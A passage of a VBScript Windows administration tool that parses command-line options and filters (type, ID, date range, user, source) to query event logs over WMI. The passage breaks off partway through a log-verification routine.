Dim strPassword             ' the password for the user to query the machine
Dim strFormat               ' format of display, default is table
Dim strRange                ' to store the range of records specified
Dim blnNoHeader             ' flag to store if header is not required
Dim blnVerboseDisplay       ' flag to verify if verbose display is needed 
ReDim arrFilters(5)         ' to store all the given filters
Dim objLogs                 ' a object to store all the given logfles

' Initialize variables
intOpCode            = 0
strFormat            = L_ConstDefaultFormat_Text
strRange             = ""
blnNoHeader          = FALSE
blnVerboseDisplay    = FALSE

Set objLogs = CreateObject("Scripting.Dictionary")

If Err.Number Then
    WScript.Echo (L_ObjCreationFail_ErrorMessage)
    WScript.Quit(EXIT_METHOD_FAIL)
End If  

' setting Dictionary object compare mode to VBBinaryCompare
objLogs.CompareMode = VBBinaryCompare

' Parse the command line
intOpCode = intParseCmdLine(strMachine, _
                            strUserName, _
                            strPassword, _
                            arrFilters, _
                            strFormat, _
                            strRange, _
                            blnVerboseDisplay, _
                            blnNoHeader, _
                            objLogs)

  If Err.number then
    ' error in parsing the Command line
     component.vbPrintf InvalidInputErrorMessage ,Array(Ucase(Wscript.ScriptName))
    WScript.Quit(EXIT_UNEXPECTED)
  End If

' check the operation specified by the user
Select Case intOpCode

    Case CONST_SHOW_USAGE
        ' help asked for
        Call ShowUsage()

    Case CONST_PROCEED
        Call ShowEvents(strMachine, strUserName, strPassword, _
            arrFilters, strFormat, strRange, _
            blnVerboseDisplay, blnNoHeader, objLogs)
            ' completed successfully
            WScript.Quit(EXIT_SUCCESS)

    Case CONST_ERROR
        ' print common help message.  
        component.vbPrintf L_HelpSyntax1_Message, Array(Ucase(Wscript.ScriptName))
        Wscript.Quit(EXIT_INVALID_INPUT)

    Case CONST_ERROR_USAGE
        ' help is asked help with some other parameters
        component.vbPrintf InvalidSyntaxErrorMessage, Array(Ucase(Wscript.ScriptName))
        WScript.Quit(EXIT_INVALID_INPUT)

    Case EXIT_INVALID_PARAM_DEFAULT_OPTION_REPEATED
            'More no of times  input values  specified.message is captured  at parser level so exit only with code.
            Wscript.Quit(EXIT_INVALID_PARAM)

    Case Else
            'Invalid input values specified.
            component.vbPrintf InvalidSyntaxErrorMessage, Array(Ucase(Wscript.ScriptName))
            Wscript.Quit(EXIT_INVALID_PARAM)

End Select

End Sub
'***************************  End of Main  **************************

'********************************************************************
'* Function: intParseCmdLine
'*
'* Purpose:  Parses the command line arguments to the variables
'*
'* Input:    
'*  [out]    strMachine         machine to query events from
'*  [out]    strUserName        user name to connect to the machine
'*  [out]    strPassword        password for the user
'*  [out]    arrFilters         the array containing the filters
'*  [out]    strFormat          the display format
'*  [out]    strRange           the range of records required
'*  [out]    blnVerboseDisplay  flag to verify if verbose display is needed 
'*  [out]    blnNoHeader        flag to verify if noheader display is needed  
'*  [out]    objLogs             to store all the given logfles
'* Output:   Returns CONST_PROCEED, CONST_SHOW_USAGE or CONST_ERROR
'*           Displays error message and quits if invalid option is asked
'*
'********************************************************************
Private Function intParseCmdLine( ByRef strMachine,      _
                                  ByRef strUserName,     _
                                  ByRef strPassword,     _
                                  ByRef arrFilters,      _
                                  ByRef strFormat,       _
                                  ByRef strRange,        _
                                  ByRef blnVerboseDisplay, _
                                  ByRef blnNoHeader,_
                                  ByRef objLogs)

    ON ERROR RESUME NEXT
    Err.Clear

    Dim strUserGivenArg ' to temporarily store the user given arguments to script
    Dim strTemp         ' to store temporary values
    Dim intArgIter      ' to count the number of arguments given by user
    Dim intArgLogType   ' to count number of log files specified - Used in ReDim
    Dim intFilterCount  ' to count number of filters specified - Used in ReDim

    Dim blnHelp         ' to check if already Help is specified  
    Dim blnFormat       ' to check if  already Format is specified  
    Dim blnRange        ' to check if already Range is specified  
    Dim blnServer       ' to check if already Server is specified  
    Dim blnPassword     ' to check if already Password is specified  
    Dim blnUser     ' to check if already User is specified  

    strUserGivenArg  = ""
    intArgLogType    = 0
    intFilterCount   = 0
    intArgIter       = 0 

    'default values  
    blnHelp         =  False
    blnPassword   =  False
    blnUser         =  False
    blnServer        =  False
    blnFormat      =  False


    ' Retrieve the command line and set appropriate variables
Do While intArgIter <= Wscript.arguments.Count - 1
     strUserGivenArg = Wscript.arguments.Item(intArgIter)

 IF   Left( strUserGivenArg,1) = "/"  OR    Left( strUserGivenArg,1) = "-"  Then 
         strUserGivenArg = Right( strUserGivenArg,Len(strUserGivenArg) -1 )

        Select Case LCase(strUserGivenArg)
            Case LCase(OPTION_SERVER)

                    'If more than  1 time(s) is spcecified
                If  blnServer  =True   Then
                  component.vbPrintf InvalidSyntaxMoreNoRepeatedErrorMessage, Array(Wscript.arguments.Item(intArgIter), Ucase(Wscript.ScriptName))
                intParseCmdLine = EXIT_INVALID_PARAM_DEFAULT_OPTION_REPEATED
                Exit Function 
                End If 

            If Not component.getArguments(L_MachineName_Text, strMachine, intArgIter, FALSE) Then
                intParseCmdLine = CONST_ERROR
                Exit Function
            End If

            blnServer  =True
                intArgIter = intArgIter + 1

            Case LCase(OPTION_USER)

                    'If more than  1 time(s) is spcecified
                If  blnUser  =True   Then
                 component.vbPrintf InvalidSyntaxMoreNoRepeatedErrorMessage, Array(Wscript.arguments.Item(intArgIter), Ucase(Wscript.ScriptName))
                intParseCmdLine = EXIT_INVALID_PARAM_DEFAULT_OPTION_REPEATED
                Exit Function 
                End If 

            If Not component.getArguments(L_UserName_Text, strUserName, intArgIter, FALSE) Then
                intParseCmdLine = CONST_ERROR
                Exit Function
            End If
           
            blnUser  =True
                intArgIter = intArgIter + 1

            Case LCase(OPTION_PASSWORD)

                    'If more than  1 time(s) is spcecified
                    If  blnPassword  =True   Then
                 component.vbPrintf InvalidSyntaxMoreNoRepeatedErrorMessage, Array(Wscript.arguments.Item(intArgIter), Ucase(Wscript.ScriptName))
                intParseCmdLine = EXIT_INVALID_PARAM_DEFAULT_OPTION_REPEATED
                Exit Function 
             End If 

            If Not component.getArguments(L_UserPassword_Text, strPassword, intArgIter, FALSE) Then
                intParseCmdLine = CONST_ERROR
                Exit Function
            End If

            blnPassword  =True
            intArgIter = intArgIter + 1

            Case LCase(OPTION_FORMAT) 

                               'If more than  1 time(s) is spcecified
            If  blnFormat  =True   Then
                component.vbPrintf InvalidSyntaxMoreNoRepeatedErrorMessage, Array(Wscript.arguments.Item(intArgIter), Ucase(Wscript.ScriptName))
                intParseCmdLine = EXIT_INVALID_PARAM_DEFAULT_OPTION_REPEATED
                Exit Function 
            End If 

            If Not component.getArguments(L_Format_Text,strFormat, intArgIter, FALSE) Then
                intParseCmdLine = CONST_ERROR
                Exit Function
            End If

            
            blnFormat  =True
            intArgIter = intArgIter + 1
           
            Case LCase(OPTION_RANGE)

                   'If more than  1 time(s) is spcecified
            If  blnRange  =True   Then
                 component.vbPrintf InvalidSyntaxMoreNoRepeatedErrorMessage, Array(Wscript.arguments.Item(intArgIter), Ucase(Wscript.ScriptName))
                intParseCmdLine = EXIT_INVALID_PARAM_DEFAULT_OPTION_REPEATED
                Exit Function 
             End If 

            If Not component.getArguments(L_Range_Text,strRange, intArgIter,TRUE) Then
                intParseCmdLine = CONST_ERROR
                Exit Function
            End If

                blnRange  =True
                intArgIter = intArgIter + 1

            Case LCase(OPTION_NOHEADER)

                  'If more than  1 time(s) is spcecified
               If  blnNoHeader  =True   Then
                 component.vbPrintf InvalidSyntaxMoreNoRepeatedErrorMessage, Array(Wscript.arguments.Item(intArgIter), Ucase(Wscript.ScriptName))
                intParseCmdLine = EXIT_INVALID_PARAM_DEFAULT_OPTION_REPEATED
                Exit Function 
               End If 

                blnNoHeader   = TRUE
                       intArgIter = intArgIter + 1
    
            Case LCase(OPTION_VERBOSE)

                    'If more than  1 time(s) is spcecified
             If  blnVerboseDisplay  =True   Then
                component.vbPrintf InvalidSyntaxMoreNoRepeatedErrorMessage, Array(Wscript.arguments.Item(intArgIter), Ucase(Wscript.ScriptName))
                intParseCmdLine = EXIT_INVALID_PARAM_DEFAULT_OPTION_REPEATED
                Exit Function 
             End If 

                 blnVerboseDisplay = TRUE
                 intArgIter = intArgIter + 1

            Case LCase(OPTION_FILTER)

            If Not component.getArguments(L_Filter_Text, strTemp, intArgIter, FALSE) Then
                intParseCmdLine = CONST_ERROR
                Exit Function
            End If

                arrFilters(intFilterCount) = strTemp
                intFilterCount = intFilterCount + 1
                intArgIter = intArgIter + 1

                If ((intFilterCount MOD 5) = 0) Then
                    ReDim PRESERVE arrFilters(intFilterCount + 5)
                End If

            Case LCase(OPTION_HELP)
  
            If  blnHelp  =True   then
                    intParseCmdLine = EXIT_INVALID_PARAM
                    Exit Function 
                End If 

            blnHelp  =True
            intParseCmdLine = CONST_SHOW_USAGE
            intArgIter = intArgIter + 1

            Case LCase(OPTION_LOGNAME)
            If Not component.getArguments(L_Log_Text, strTemp, intArgIter, FALSE) Then
                intParseCmdLine = CONST_ERROR
                Exit Function
            Else
                If NOT objLogs.Exists(LCase(strTemp)) Then
                    objLogs.Add LCase(strTemp), -1
                End If
                    intArgIter = intArgIter + 1
            End if

            Case Else
                    ' invalid   switch specified 
                    component.vbPrintf InvalidParameterErrorMessage, Array(Wscript.arguments.Item(intArgIter),Ucase(Wscript.ScriptName))
                    Wscript.Quit(EXIT_INVALID_INPUT)
          
            End Select
Else      
                ' invalid argument  specified  
        component.vbPrintf InvalidParameterErrorMessage, Array(Wscript.arguments.Item(intArgIter),Ucase(Wscript.ScriptName))
        Wscript.Quit(EXIT_INVALID_INPUT)
End  IF         

Loop '** intArgIter <= Wscript.arguments.Count - 1
    
    ' preserving the array with current dimension
    ReDim PRESERVE arrFilters(intFilterCount-1)

    ' if no logs specified for query
    If (ObjLogs.Count = 0 ) Then
          ObjLogs.Add "*", -1
    End If  
    
    ' check for invalid usage of help   
    If  blnHelp and  intArgIter > 1     Then    
        intParseCmdLine = CONST_ERROR_USAGE
        Exit Function 
    End If
 
    'check  with default case : no  arguments specified 
    If IsEmpty(intParseCmdLine) Then 
        intParseCmdLine = CONST_PROCEED
    End If

End Function

'********************************************************************
'* Function: ValidateArguments
'*
'* Purpose:  Validates the command line arguments given by the user
'*
'* Input:
'*  [in]    strMachine         machine to query events from
'*  [in]    strUserName        user name to connect to the machine
'*  [in]    strPassword        password for the user
'*  [in]    strFormat          the display format
'*  [in]    strRange           the range of records required
'*  [in]    blnNoHeader    flag to verify if noheader display is needed  
'*  [out]   arrFilters         the array containing the filters
'*
'* Output:   Returns true if all valid else displays error message and quits
'*           Gets the password from the user if not specified along with User.
'*
'********************************************************************
Private Function ValidateArguments (ByVal strMachine, _
                                    ByVal strUserName, _
                                    ByVal strPassword, _
                                    ByRef arrFilters, _
                                    ByVal strFormat, _
                                    ByVal strRange,_
                                    ByVal blnNoHeader)

    ON ERROR RESUME NEXT
    Err.Clear

      Dim arrTemp                     ' to store temporary array values

     ' Check if invalid Server name is given  
    If   NOT  ISEMPTY(strMachine)  THEN
            If Trim(strMachine) =  vbNullString  Then
                WScript.Echo (L_InValidServerName_ErrorMessage)
                WScript.Quit(EXIT_INVALID_INPUT) 
            End If
    End If 

    'Check if invalid User name is given 
     If   NOT  ISEMPTY(strUserName)  THEN
             If Trim(strUserName) =  vbNullString  Then
                WScript.Echo (L_InValidUserName_ErrorMessage )
                WScript.Quit(EXIT_INVALID_INPUT)
            End If 
     End If

    ' ERROR if user is given without machine OR
    '          password is given without user
        If ((strUserName <> VBEmpty) AND (strMachine = VBEmpty)) Then
             component.vbPrintf InvalidCredentialsForServerErrorMessage, Array(Ucase(Wscript.ScriptName))
            WScript.Quit(EXIT_INVALID_INPUT)
        ElseIf  ((strPassword <> VBEmpty) AND (strUserName = VBEmpty))Then
            component.vbPrintf InvalidCredentialsForUserErrorMessage, Array(Ucase(Wscript.ScriptName))
            WScript.Quit(EXIT_INVALID_INPUT)
        End If

    ' only table, list and csv display formats allowed
    ' PATTERNFORMAT   '"^(table|list|csv)$"
    
    If CInt(component.matchPattern(PATTERNFORMAT,strFormat)) = CONST_NO_MATCHES_FOUND Then
        component.vbPrintf InvalidFormatErrormessage, Array(strFormat ,Ucase(Wscript.ScriptName))
        WScript.Quit(EXIT_INVALID_INPUT)
    End If 

      '  check : -n  header is specified  for  format of  'LIST' option   
    If   blnNoHeader =True  and    Lcase(strFormat) =  Lcase(L_Const_List_Format_Text) then
        WScript.Echo (L_NoHeaderaNotApplicable_ErrorMessage)
        WScript.Quit(EXIT_INVALID_INPUT)
        End If 

    If Len(Trim(strRange)) > 0 Then
        ' range is specified, valid formats are N, -N or N1-N2
        ' PATTERN_RANGE    '"^(\d+|\-\d+|\d+\-\d+)$"
        If CInt(component.matchPattern(PATTERN_RANGE, strRange)) = CONST_NO_MATCHES_FOUND Then
            component.vbPrintf L_InvalidRange_ErrorMessage, Array(strRange)
            WScript.Quit(EXIT_INVALID_INPUT)
        Else

            strRange = CLng(Abs(strRange)) 

                    'this err an be trappped when N1-N2 option is given     
            If Err.Number Then
                arrTemp =   split(strRange, "-", 2, VBBinaryCompare)
                If CLng(arrTemp(0)) => CLng(arrTemp(1)) Then
                    ' invalid range
                    component.vbPrintf L_InvalidRange_ErrorMessage, Array(strRange)
                    WScript.Quit(EXIT_INVALID_INPUT)
                End If
                    Err.Clear 'if no invalid range  N1-N2  clear the error 
            Else
                If Abs(strRange) = 0 Then
                    component.vbPrintf L_InvalidRange_ErrorMessage, Array(strRange)
                    WScript.Quit(EXIT_INVALID_INPUT)
                End If
            End If
        End If
    End If

    ValidateArguments = TRUE
End Function

'********************************************************************
'* Function: ValidateFilters
'*
'* Purpose:  Validates the filters given by the user.
'*
'* Input:    [in]  Objservice     the service object
'* Input:    [out] arrFilters     the array containing the filters
'*
'* Output:   If filter is invalid, displays error message and quits
'*           If valid, filter is prepared for the query and returns true
'*
'********************************************************************
Private Function ValidateFilters(ByRef arrFilters ,ByVal ObjService)

    ON ERROR RESUME NEXT
    Err.Clear

    Dim  j                  ' to use in the loop
    Dim strFilter          ' to store the user given filter (Eg:"Type eq Error")
    Dim arrTempProp        ' to store the temporary array filterproperty 
    Dim arrTempOperAndVal  ' to store the temporary array filteroperator and filtervalue 
    Dim strTemp            ' to store temporary values
    Dim arrTemp            ' to store temporary values of datetime when Range is given (Date1-Date2) 
    Dim strFilterProperty  ' the filter criteria that is specified (Eg:Type, ID)
    Dim strFilterOperation ' the operation specified (Eg: eq, gt)
    Dim strFilterValue     ' the filter value specified

    Dim objInstance        ' to refer to the instances of the objEnumerator
    Dim objEnumerator      ' to store the results of the query is executed 
        Dim strTempQuery       ' string to make query  
    Dim strTimeZone        ' to store the TimeZone  of the Queried system 
    Dim strSign            ' to store "+|-" sign value of TimeZone 

    ' validate each filter stored in the array
    For j = 0 to UBound(arrFilters)
        strFilter = arrFilters(j)
        
        'check eigther  "OR" is pesent inthe filter value  
        'Example  :  "type  eq warning  " OR "  type eq error"    [to support ORing in Filter Switch]
        'Make a flag in this case  "blnOR"  present/not  
        'split it by "OR" SEND   as No. of   Array elements
        Dim  blnOR                  'boolean to refer  'OR' operation is specified
        Dim  strArrFilter       'string to store array of filters if  OR is specified 

        blnOR=False       'Initialise to False

        
      If   UBOUND(Split(LCase(strFilter),LCase(L_OperatorOR_Text)) ) > 0  Then
           'setting the flag if " OR " specified in filter
             blnOR =TRUE

            'split with "OR"    
             strArrFilter =  Split(LCase(strFilter),LCase(L_OperatorOR_Text))
       Else
                'make single dimention array   UBOUND = 0  
                strArrFilter = Array(strFilter)
       End If
       
        Dim k       '  to use in the loop
        Dim  strTempFilter ' used to format Query string    

        'process  the array for validatation 
        'UBOUND = 0  say normal filter specified      
        For k = 0 to UBound(strArrFilter) 

            If   UBound(strArrFilter) > 0 then
                 strFilter =strArrFilter(k)
            Else
                    'this is the first element  allways
                  strFilter =strArrFilter(0)
            End If 

         ' check if 3 parameters are passed as input to filter
        ' PATTERN_FILTER  "^([a-z]+)([\s]+)([a-z]+)([\s]+)(\w+)"

        strFilter = Trim( strFilter )               ' trim the value
        If CInt(component.matchPattern(PATTERN_FILTER, strFilter)) <= 0 Then
            component.vbPrintf L_InvalidFilterFormat_ErrorMessage, Array(strFilter)
            WScript.Quit(EXIT_INVALID_INPUT)
        End If

                 
            ' This to  eliminate any no.of blank Char(s)  between three valid  input values 
            ' i.e..filter "property ---operation ----value"
            ' first  SPLIT the space delimiter string into  array size of 2.
            ' and get the property value 
            arrTempProp = split(Trim(strFilter)," ",2,VBBinaryCompare)
            strFilterProperty  = arrTempProp(0)

            ' now trim it and again  SPLIT the second element of arrTempProp into an array of size 2.
            ' and get the operation and value  
            arrTempOperAndVal   = split(Trim(arrTempProp(1))," ",2,VBBinaryCompare)
            strFilterOperation  = arrTempOperAndVal(0)
            strFilterValue      = Ltrim(arrTempOperAndVal(1))
            
            If LCase(strFilterProperty) = LCase(L_UserFilterDateTime_Text) OR _
                LCase(strFilterProperty) = LCase(L_UserFilterId_Text) Then
                ' the following are valid operators
                If LCase(strFilterOperation) = LCase(L_OperatorEq_Text)  OR _
                    LCase(strFilterOperation) = LCase(L_OperatorNe_Text) OR _
                    LCase(strFilterOperation) = LCase(L_OperatorGe_Text) OR _
                    LCase(strFilterOperation) = LCase(L_OperatorLe_Text) OR _
                    LCase(strFilterOperation) = LCase(L_OperatorGt_Text) OR _
                    LCase(strFilterOperation) = LCase(L_OperatorLt_Text) Then
                    
                    strTemp = ReplaceOperators(strFilterOperation)
                    strFilterOperation = strTemp
                Else
                    component.vbPrintf L_InvalidFilterOperation_ErrorMessage, Array(strFilterOperation, strFilter)
                    WScript.Quit(EXIT_INVALID_INPUT)
                End If
                
            ElseIf LCase(strFilterProperty) = LCase(L_UserFilterType_Text) OR _
                    LCase(strFilterProperty) = LCase(L_UserFilterUser_Text) OR _
                     LCase(strFilterProperty) = LCase(L_UserFilterComputer_Text) OR _
                    LCase(strFilterProperty) = LCase(L_UserFilterSource_Text) OR _
                    LCase(strFilterProperty) = LCase(L_UserFilterDateCategory_Text) Then
                ' for others, only these two operators are valid
                If LCase(strFilterOperation) = LCase(L_OperatorEq_Text) OR _
                    LCase(strFilterOperation) = LCase(L_OperatorNe_Text) Then
                    
                    strTemp = ReplaceOperators(strFilterOperation)
                    strFilterOperation = strTemp
                Else
                    component.vbPrintf L_InvalidFilterOperation_ErrorMessage, _
                            Array(strFilterOperation, strFilter)
                        WScript.Quit(EXIT_INVALID_INPUT)
                End If
            Else
                    component.vbPrintf L_InvalidFilterOperation_ErrorMessage, _
                    Array(strFilterProperty, strFilter)
                    WScript.Quit(EXIT_INVALID_INPUT)
            End If
                
            ' validate the filter asked for
            Select Case LCase(strFilterProperty)
            
                Case L_UserFilterDateTime_Text
                
                'Checking  " OR " is only supported property  EQ "TYPE OR ID" only 
                If  blnOR = True then
                           WScript.Echo  InvalidORSyntaxInFilterErrorMessage
                           WScript.Quit(EXIT_INVALID_INPUT)
                End If

                    ' Here To find Time Zone of system from   CLASS_TIMEZONE_FILE 
                     strTempQuery = "SELECT *  FROM Win32_OperatingSystem " 

                    Set objEnumerator = objService.ExecQuery(strTempQuery,,0)

                            ' getting the  Time Zone    
                    For each objInstance in objEnumerator
                             strTimeZone = objInstance.CurrentTimeZone  
                    Next

                    'here to format timeZome value as '+/-' UUU 

                        If Isnull(strTimeZone) or IsEmpty(strTimeZone)then
                             strTimeZone =0
                        End If 

                        'default sign   
                        strSign ="+"     
                    
                        IF  strTimeZone < 0  THEN
                             strSign ="-"
                        End If    
                    
                        If Len(strTimeZone) < 4 then
                             If Len(strTimeZone) = 3 then
                                     If strTimeZone < 0 then 
                                             strTimeZone = Replace(strTimeZone,"-","0")    
                                     End If
                             ElseIf Len(strTimeZone) = 2 then
                                     If strTimeZone < 0 then
                                            strTimeZone = Replace(strTimeZone,"-","00")    
                                     Else
                                            strTimeZone = "0" & strTimeZone     
                                    End If            
                             ElseIf Len(strTimeZone) = 1 then
                                       IF  strTimeZone >= 0  Then
                                            strTimeZone = "00" & strTimeZone     
                                       End if 
                              End If   
                                         'return to a format  as  "+|-" & UUU 
                             strTimeZone= strSign & strTimeZone          
                         End If

                    ' check for the valid format - mm/dd/yy,hh:mm:ssPM
                    ' PATTERN_DATETIME 
                    If CInt(component.matchPattern(PATTERN_DATETIME, strFilterValue)) > 0 Then
                        If component.validateDateTime(strFilterValue) Then
                            ' a valid datetime filter. Prepare for query
                                strFilterProperty = FLD_FILTER_DATETIME
                                strTemp = component.changeToWMIDateTime(strFilterValue,strTimeZone)
                                ' Format the input 
                                ' TimeGenerated > "07/25/2000 10:12:00 PM"
                                strFilterValue = Chr(34) & strTemp & Chr(34)
                        End If
                    Else
                        ' match for range of dates in the format 
                        ' mm/dd/yy,hh:mm:ssPM - mm/dd/yy,hh:mm:ssAM
                        ' PATTERN_DATETIME_RANGE 
        
                        If CInt(component.matchPattern(PATTERN_DATETIME_RANGE, strFilterValue)) > 0 Then
                            strFilterProperty = FLD_FILTER_DATETIME
                            ' Only = operation supported in this format
                            If strFilterOperation <> "=" Then
                                WScript.Echo (L_InvalidOperator_ErrorMessage)
                                WScript.Quit(EXIT_INVALID_INPUT)
                            End If
                    
                            arrTemp = split(strFilterValue,"-",2,VBBinaryCompare)

                            If component.validateDateTime(arrTemp(0)) Then
                                    ' a valid datetime filter. Prepare for query
                                    strTemp = component.changeToWMIDateTime(arrTemp(0),strTimeZone)
                                    ' Format the input 
                                    ' TimeGenerated > "07/25/2000 10:12:00 PM"
                                    strFilterOperation = ">="
                                    strFilterValue = Chr(34) & strTemp & Chr(34)

                                    If component.validateDateTime(arrTemp(1)) Then
                                        ' a valid datetime filter. Prepare for query
                                        strTemp = component.changeToWMIDateTime(arrTemp(1),strTimeZone)
                                        ' Format the input 
                                        ' TimeGenerated > "07/25/2000 10:12:00 PM"
                                        strFilterValue = strFilterValue & _
                                        " AND " & strFilterProperty & "<="& Chr(34)_
                                        & strTemp & Chr(34)
                                    End If
                                End If
                            Else
                                component.vbPrintf L_InvalidDateTimeFormat_ErrorMessage, Array(strFilter)
                                WScript.Quit(EXIT_INVALID_INPUT)
                            End If
                        End If

                Case L_UserFilterType_Text
                
                        ' the following values are only valid for the "Type" filter
                        ' Valid: ERROR|INFORMATION|WARNING|SUCCESSAUDIT|FAILUREAUDIT
                        ' PATTERNTYPE 

                        If CInt(component.matchPattern(PATTERNTYPE, strFilterValue)) = _
                                                    CONST_NO_MATCHES_FOUND Then
                            component.vbPrintf L_InvalidType_ErrorMessage, Array(strFilterValue, strFilter)
                            WScript.Quit(EXIT_INVALID_INPUT)
                        Else
        '                        here i need to check WINXP or not
                                 If  ( IsWinXP ( ObjService) = TRUE ) Then 
                                    
                                           ' a valid type filter. Prepare for query
                                            If LCase(strFilterValue) =LCase(PATTERNTYPE_ERROR) Then
                                                strFilterValue  = EVENTTYPE_ERROR
                                            ElseIf LCase(strFilterValue) =LCase(PATTERNTYPE_WARNING) Then
                                                strFilterValue  = EVENTTYPE_WARNING
                                            ElseIf LCase(strFilterValue) =LCase(PATTERNTYPE_INFORMATION) Then
                                                strFilterValue  = EVENTTYPE_INFORMATION
                                            ElseIf LCase(strFilterValue) =LCase(PATTERNTYPE_SUCCESSAUDIT) Then
                                                strFilterValue  = EVENTTYPE_SUCCESSAUDIT
                                            ElseIf  LCase(strFilterValue) =LCase(PATTERNTYPE_FAILUREAUDIT) Then
                                                strFilterValue  = EVENTTYPE_FAILUREAUDIT
                                            End If 

                                            ' a valid type filter. Prepare for query
                                            strFilterProperty = FLD_FILTER_EVENTTYPE
                                  Else 
                                       ' a valid type filter. Prepare for query
                                        If LCase(strFilterValue) =LCase(PATTERNTYPE_SUCCESSAUDIT) Then
                                            strFilterValue  = FLDFILTERTYPE_SUCCESSAUDIT
                                        ElseIf  LCase(strFilterValue) =LCase(PATTERNTYPE_FAILUREAUDIT) Then
                                            strFilterValue  = FLDFILTERTYPE_FAILUREAUDIT
                                        End If 

                                        ' a valid type filter. Prepare for query
                                        strFilterProperty = FLD_FILTER_TYPE
                                        
                                  End If 

                        End If

                Case L_UserFilterUser_Text

               'Checking  " OR " is only supported property  EQ "TYPE OR ID" only 
                If  blnOR = True then
                           WScript.Echo  InvalidORSyntaxInFilterErrorMessage
                           WScript.Quit(EXIT_INVALID_INPUT)
                End If

                        ' these are invalid characters for a user name
                        ' PATTERN_INVALID_USER
        
                        If CInt(component.matchPattern(PATTERN_INVALID_USER, strFilterValue)) > 0 Then
                            component.vbPrintf L_InvalidUser_ErrorMessage , Array(strFilterValue, strFilter)
                            WScript.Quit(EXIT_INVALID_INPUT)
                        Else
                            
                            ' a valid user filter. Prepare for query
                            If InStr(1, strFilterValue, "\", VBBinaryCompare) Then
                                strFilterValue = Replace(strFilterValue, "\","\\")
                            End If
                            
                            If LCase(strFilterValue) =LCase(L_TextNa_Text) Then
                                strFilterValue  = Null
                            End If      

                        End If
                        strFilterProperty = FLD_FILTER_USER

                Case L_UserFilterComputer_Text
                            ' a valid computer filter. Prepare for query
                            strFilterProperty = FLD_FILTER_COMPUTER

                'Checking  " OR " is only supported property  EQ "TYPE OR ID" only 
                If  blnOR = True then
                           WScript.Echo  InvalidORSyntaxInFilterErrorMessage
                           WScript.Quit(EXIT_INVALID_INPUT)
                End If

                Case L_UserFilterSource_Text
                            ' a valid Source filter. Prepare for query
                            strFilterProperty = FLD_FILTER_SOURCE

                'Checking  " OR " is only supported property  EQ "TYPE OR ID" only 
                If  blnOR = True then
                           WScript.Echo  InvalidORSyntaxInFilterErrorMessage
                           WScript.Quit(EXIT_INVALID_INPUT)
                End If

                Case L_UserFilterDateCategory_Text

                'Checking  " OR " is only supported property  EQ "TYPE OR ID" only 
                If  blnOR = True then
                           WScript.Echo  InvalidORSyntaxInFilterErrorMessage
                           WScript.Quit(EXIT_INVALID_INPUT)
                End If

                            ' a valid Category filter. Prepare for query
                            If LCase(strFilterValue) =LCase(L_TextNone_Text) Then
                                strFilterValue  = Null
                            End If 

                             strFilterProperty = FLD_FILTER_CATEGORY 
                    
                Case L_UserFilterId_Text
                        ' check if the given id is a number
                        ' PATTERN_ID '"^(\d+)$"
                        If CInt(component.matchPattern(PATTERN_ID, strFilterValue)) = CONST_NO_MATCHES_FOUND Then
                            component.vbPrintf L_InvalidId_ErrorMessage, Array(strFilterValue, strFilter)
                            WScript.Quit(EXIT_INVALID_INPUT)
                        Else
                            ' Invalid ID Number  validation     
                            If  ( Clng(strFilterValue)   >  CONST_ID_NUMBER )Then     
                                component.vbPrintf L_InvalidId_ErrorMessage, Array(strFilterValue, strFilter)
                                WScript.Quit(EXIT_INVALID_INPUT)
                            End If

                            ' a  valid id filter. Prepare for query
                            strFilterProperty = FLD_FILTER_ID
                        End If

                Case Else 
                        ' invalid filter specified
                        component.vbPrintf L_InvalidFilter_ErrorMessage, Array(strFilterProperty, strFilter)
                        WScript.Quit(EXIT_INVALID_INPUT)
            End Select

            If LCase(strFilterProperty) = LCase(FLD_FILTER_DATETIME) OR IsNull(strFilterValue) Then
                ' This is to handle NULL Property  values i.e for category ,type          
                If   IsNull(strFilterValue) Then
                 strFilter = strFilterProperty & strFilterOperation & strFilterValue & "Null"
                Else
                 strFilter = strFilterProperty & strFilterOperation & strFilterValue  
                End If 
                
            Else
                strFilter = strFilterProperty & _
                            strFilterOperation & Chr(34) & strFilterValue & Chr(34)
            End If

        'Binding the string with "OR" to Prepare for query if blnOR  is true
         If blnOR =TRUE Then

            If k =  0 then  
                        strTempFilter = strFilter 
            Else
                        strTempFilter = strTempFilter  &  " OR " &  strFilter
            End If 
        
        End If 
 
    Next  

        'Set again making single filter string element if blnOR is TRUE 
    If blnOR =TRUE Then
                'this  "()" Add  the order of precedence of operation is SQL 
                 strFilter = "( " & strTempFilter & ")"
        End If

    'Here setting filter to main array
         arrFilters(j) = strFilter


    Next

    ValidateFilters = TRUE

End Function

'********************************************************************
'* Function: ReplaceOperators
'*
'* Purpose:  Replaces the operator in string form with its symbol
'*
'* Input:   
'*       [in]    strFilterOperation     the operation
'*
'* Output:   Returns the symbolic operator
'*           If invalid operator, displays error message and quits
'*
'********************************************************************
Private Function ReplaceOperators(ByVal strFilterOperation)
    ON ERROR RESUME NEXT
    Err.Clear

    Select Case LCase(strFilterOperation)

        Case L_OperatorEq_Text
                    ReplaceOperators = SYMBOL_OPERATOR_EQ

        Case L_OperatorNe_Text
                    ReplaceOperators = SYMBOL_OPERATOR_NE

        Case L_OperatorGe_Text
                    ReplaceOperators = SYMBOL_OPERATOR_GE

        Case L_OperatorLe_Text
                    ReplaceOperators = SYMBOL_OPERATOR_LE

        Case L_OperatorGt_Text
                    ReplaceOperators = SYMBOL_OPERATOR_GT

        Case L_OperatorLt_Text
                    ReplaceOperators = SYMBOL_OPERATOR_LT

        Case Else
                ' not a valid operator
                component.vbPrintf L_Invalid_ErrorMessage, Array(strFilterOperation)
                WScript.Quit(EXIT_INVALID_PARAM)
    End Select
End Function
'********************************************************************
'* Sub : VerifyLogAndGetMaxRecords
'*
'* Purpose:  populates the output array  with count of records in given  input array
'*
'* Input:    [in]  objService        the service object
'*           [out] objLogs           the object containing the logs & max count of records corresponding log
'*
'* Output:   array's  are  populates with logfile names and its count of  max records
'*
'********************************************************************
Private Sub VerifyLogAndGetMaxRecords(ByVal objService, _
                 ByRef objLogs)

    ON ERROR RESUME NEXT
    Err.Clear
    
    Dim strTempQuery     ' string to make query  
    Dim objEnumerator    ' to get the collection object after query
    Dim objInstance      ' to refer to each instance of the results got
    Dim i                ' for  initialing  loop
    Dim strLogFile       ' used to   store log file  inside loop  
    Dim arrKeyName       ' used to store key value of Dictionary object for processing loop   

    arrKeyName = objLogs.Keys

    For i = 0  to  objLogs.Count -1 
        strLogFile = arrKeyName(i)
        If Not strLogFile = "*" Then
            ' Check if log file exists, by querying 
            strTempQuery = "SELECT NumberOfRecords FROM Win32_NTEventlogFile " &_
